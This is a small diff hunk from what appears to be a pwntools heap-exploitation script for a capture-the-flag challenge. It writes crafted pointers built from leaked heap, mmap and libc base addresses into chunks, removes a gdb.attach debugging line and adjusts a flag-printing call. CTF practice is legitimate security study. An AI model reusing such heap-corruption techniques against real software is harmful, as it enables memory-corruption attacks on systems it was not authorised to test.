@@ -75,7 +75,6 @@ edit(2,p64(heap_base+0x290)+p64(mmap_addr-0x10))
 add(0x100) #1
 
 edit(0,p64(libc_base+0x1ebce0))
-gdb.attach(io)
-puts_flag(True)
+puts_flag(True,0)
 #puts flag
 io.recv()
